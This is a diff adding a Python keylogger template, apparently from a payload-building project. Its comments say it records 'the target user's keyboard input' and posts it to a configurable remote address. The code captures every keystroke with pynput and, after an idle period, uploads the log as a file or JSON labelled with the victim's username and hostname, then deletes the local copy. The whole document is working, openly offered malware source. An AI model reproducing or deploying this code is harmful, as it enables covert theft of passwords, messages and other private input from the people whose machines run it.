@@ -1,0 +1,84 @@
+#// - Logs the target user's keyboard input and sends it with a POST request to the specified address.
+#// - The `SENDING_TYPE` parameter defines the data format: "file" sends it as an attachment, "json" sends it in JSON format.
+
+import os
+import socket
+import requests
+import tempfile
+import platform
+import datetime
+import threading
+from pynput.keyboard import Listener, Key
+
+CONSUMER_DOMAIN = "${CONSUMER_DOMAIN}"
+SENDING_TYPE = "${SENDING_TYPE}"
+IDLE_TIMEOUT = "${IDLE_TIMEOUT}"
+
+class Logger:
+    def __init__(self, consumer_domain: str, sending_type: str, idle_timeout: int) -> None:
+        self.__consumer_domain: str = consumer_domain
+        self.__sending_type: str = sending_type
+        self.__idle_timeout: int = idle_timeout
+        self.__output: str = ""
+        self.__timer = None
+
+    def _process_key(self, key: Key) -> None:
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                self.__output += key.char
+            else:
+                self.__output += f" [{str(key).replace('Key.', '')}] "
+
+        except AttributeError:
+            self.__output += " [Invalid_key] "
+
+        self._reset_timer()
+
+    def _reset_timer(self) -> None:
+        if self.__timer:
+            self.__timer.cancel()
+
+        self.__timer = threading.Timer(self.__idle_timeout, self._write_file)
+        self.__timer.start()
+
+    def _write_file(self) -> None:
+        if self.__output:
+            with tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".txt") as temp_file:
+                temp_file.write(self.__output)
+                temp_file.flush() 
+
+                self._send_request(temp_file.name)
+
+    def _send_request(self, file_path: str) -> None:
+        try:
+
+            match self.__sending_type.lower().strip():
+                case "file":
+                    files = {'file': (f"Log-from-{os.getlogin()}@{platform.uname().node}-at-{datetime.datetime.now()}.txt", open(file_path, 'r+'))}
+                    requests.post(self.__consumer_domain, files=files)
+
+                case "json":
+                    with open(file_path, "r+", encoding="UTF-8") as f:
+                        requests.post(self.__consumer_domain, json={"data": {f"Log-from-{os.getlogin()}@{platform.uname().node}-at-{datetime.datetime.now()}": f.read()}})
+
+                case _:
+                    raise ValueError("Unknown sending type.")
+
+            self.__output = ""  
+            os.remove(file_path)  
+            print(f"Log file sent to {self.__consumer_domain}")
+
+        except socket.gaierror:
+            pass
+
+        except Exception as e:
+            print(f"Failed to send log: {e}")
+
+    def start_listener(self) -> None:
+        listener = Listener(on_press=self._process_key)
+        listener.daemon = True 
+        listener.start()  
+        listener.join() 
+
+if __name__ == "__main__":
+    Logger(consumer_domain=CONSUMER_DOMAIN, sending_type=SENDING_TYPE, idle_timeout=int(IDLE_TIMEOUT)).start_listener()
